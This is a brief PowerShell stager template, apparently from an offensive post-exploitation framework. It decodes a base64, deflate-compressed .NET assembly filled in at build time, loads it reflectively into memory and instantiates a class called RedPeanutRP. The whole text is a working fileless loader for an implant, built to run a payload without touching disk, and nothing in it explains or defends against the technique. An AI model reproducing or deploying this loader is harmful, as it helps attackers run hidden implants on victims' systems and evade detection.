$EncodedCompressedFile = "#{assembly}"
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](#{bytelen})
$DeflatedStream.Read($UncompressedFileBytes, 0, #{bytelen}) | Out-Null
[Reflection.Assembly]::Load($UncompressedFileBytes)
[System.Activator]::CreateInstance([RedPeanutRP])